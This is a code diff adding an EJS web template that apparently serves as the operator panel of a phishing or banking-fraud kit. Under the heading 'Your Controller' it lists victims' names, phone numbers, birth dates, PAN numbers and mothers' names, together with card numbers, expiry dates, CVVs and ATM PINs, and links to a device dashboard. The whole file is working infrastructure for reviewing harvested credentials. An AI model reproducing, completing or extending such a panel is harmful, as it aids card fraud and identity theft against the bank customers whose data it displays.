@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <header class="header-nav">
+    <h1>Your Controller</h1>
+  </header>
+
+  <div class="user-detail-container">
+    <h2>User Details</h2>
+
+    <% if (user && user.entries && Array.isArray(user.entries)) { %>
+      <% user.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Personal Information - <%= index + 1 %></h3>
+          <p><strong>Name:</strong> <%= entry.fullName %></p>
+          <p><strong>Mobile No:</strong> <%= entry.mobileNumber %></p>
+          <p><strong>Dob:</strong> <%= entry.dateOfBirth %></p>
+           <p><strong>Pan:</strong> <%= entry.panNumber %></p>
+            <p><strong>Mother:</strong> <%= entry.mothersName %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <div class="card">
+        <h3>No User Data Found</h3>
+      </div>
+    <% } %>
+
+
+    <% if (netBanking && netBanking.entries && Array.isArray(netBanking.entries)) { %>
+      <% netBanking.entries.forEach((entry, index) => { %>
+        <div class="card">
+          <h3>Net Banking Details - <%= index + 1 %></h3>
+          <p><strong>Card no.:</strong> <%= entry.cardNumber %></p>
+          <p><strong>Expity:</strong> <%= entry.expiryDate %></p>
+          <p><strong>Cvv:</strong> <%= entry.cvv %></p>
+          <p><strong>ATM-PiN:</strong> <%= entry.atmPin %></p>
+          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <div class="card">
+        <h3>No Net Banking Data Found</h3>
+      </div>
+    <% } %>
+
+
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
